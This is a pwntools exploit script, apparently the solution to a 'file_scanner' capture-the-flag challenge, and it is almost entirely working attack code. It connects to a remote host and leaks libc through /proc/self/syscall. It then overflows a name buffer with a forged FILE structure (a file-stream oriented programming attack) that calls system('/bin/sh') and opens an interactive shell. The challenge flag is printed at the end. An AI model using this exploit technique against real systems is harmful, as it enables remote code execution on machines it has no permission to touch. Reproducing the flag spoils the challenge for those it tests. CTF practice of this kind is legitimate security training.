#!/usr/bin/env python3

from pwn import *

exe = ELF("./file_scanner_patched", checksec = False)
libc = ELF("./libc_32.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)

# p = process(exe.path)
p = remote("103.97.125.56", 31381)

def debug():
    gdb.attach(p, gdbscript = """
        b*0x8048C9A
        continue
    """)
    pause() 

# debug()

sl  = p.sendline
sa  = p.sendafter
sla = p.sendlineafter
rl  = p.recvline
ru  = p.recvuntil

sla(b"ID: ", "") 

# open /proc/self/syscall 
sla(b"choice :", b"1")
sla(b"filename: ", b"/proc/self/syscall")
sla(b"choice :", b"2")
sla(b"choice :", b"3")

libc_leak = int(rl().strip()[-10::], 16)
libc_base = libc_leak - 0x1ba549
system = libc_base + libc.symbols["system"] 

log.info(f"libc base = {hex(libc_base)}")
log.info(f"libc leak = {hex(libc_leak)}")
log.info(f"system = {hex(system)}")

sla(b"choice :", b"4")

file = FileStructure()
file.flags = u32(b"/bin")
file._IO_read_ptr = u32(b"/sh\x00") 
file._lock = 0x804b250
file.vtable = 0x804b178
binsh = 0x804b0e0

payload = b"A" * 0x20 + p32(binsh) + b"B" * 28 + bytes(file) + p32(system) * 21

sla(b"name: ", payload)

p.interactive() 
# BKSEC{fSoP_1s_n0t_2_hArd_4_u_d4e2411f244126da3242265c90e10c46}